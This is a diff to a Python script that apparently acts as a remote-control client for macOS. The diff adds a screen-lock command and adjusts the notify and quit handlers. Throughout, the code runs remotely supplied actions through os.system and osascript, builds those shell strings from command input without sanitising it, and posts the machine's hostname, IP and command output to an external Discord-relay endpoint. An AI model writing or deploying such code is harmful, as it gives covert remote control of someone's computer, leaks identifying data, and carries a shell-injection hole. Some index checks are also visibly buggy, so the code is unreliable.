@@ -167,6 +167,24 @@ while True:
                                     except KeyboardInterrupt:
                                         continue
                                     continue
+                            elif localcmd[1] == 'lock' or localcmd[1] == 'lockscreen':
+                                if ossystem('osascript -e \'tell application "System Events" to keystroke "q" using {command down, control down}\'') == 0:
+                                    try:
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```computer going to lockscreen, cya...```")
+                                        old_command = command
+                                    except:
+                                        try:
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to start lockingscreen```")
+                                        except KeyboardInterrupt:
+                                            continue
+                                        continue
+                                else:
+                                    try:
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to start lockingscreen```")
+                                    except KeyboardInterrupt:
+                                        continue
+                                    continue
+
                         except:
                             continue
 
@@ -198,7 +216,7 @@ while True:
                                     continue
                             elif localcmd[1] == 'notify' or localcmd[1] == 'notification':
                                 if localcmd[4>len(localcmd)]:
-                                    if ossystem(f"osascript -e 'display notification \"{localcmd[2]}\" with title \"{localcmd[3]}\" subtitle \"{localcmd[4]}\"'"):
+                                    if ossystem(f"osascript -e 'display notification \"{localcmd[2]}\" with title \"{localcmd[3]}\" subtitle \"{localcmd[4]}\"'") == 0:
                                         try:
                                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Notified successfully```")
                                             old_command = command
@@ -248,7 +266,7 @@ while True:
                                             continue
                             elif localcmd[1] == 'quit' or localcmd[1] == 'close':
                                 if localcmd[2<len(localcmd)]:
-                                    if ossystem(f'sudo osascript -e \'tell app "{localcmd[2]}" to quit\'') == 0:
+                                    if ossystem(f'osascript -e \'tell app "{localcmd[2]}" to quit\'') == 0:
                                         try:
                                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Successfully quitted {localcmd[2]}```")
                                             old_command = command
@@ -265,7 +283,7 @@ while True:
 
 
                                         
-
+                            continue
 
                         except:
                             try:
